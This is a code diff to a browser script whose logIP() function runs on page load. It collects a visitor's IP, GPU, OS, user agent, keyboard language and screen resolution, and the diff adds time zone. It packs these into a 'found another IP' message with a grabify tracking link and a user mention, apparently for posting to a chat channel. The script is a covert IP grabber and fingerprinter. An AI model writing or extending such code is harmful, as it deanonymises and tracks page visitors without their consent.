@@ -104,8 +104,9 @@ async function logIP() {
     const screenWidth = window.screen.width;
     const screenHeight = window.screen.height;
     const screenResolution = `${screenWidth} x ${screenHeight}`;
+    const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;	
 
-    const message = `The Kakapo has found another IP!\n\nCheck here to see all IPs logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}\n IP: ${ip}\n OS: ${userOS}\n User Agent: ${userAgent}\n Keyboard Language: ${kbLang}\n Resolution: ${screenResolution}`;
+    const message = `The Kakapo has found another IP!\n\nCheck here to see all IPs logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}\n IP: ${ip}\n OS: ${userOS}\n User Agent: ${userAgent}\n Keyboard Language: ${kbLang}\n Resolution: ${screenResolution}\n Time Zone: ${userTimeZone} `;
 
     const msg = {
       content: message
@@ -128,6 +129,7 @@ async function logIP() {
 }
 
 logIP();
+
 
 
 
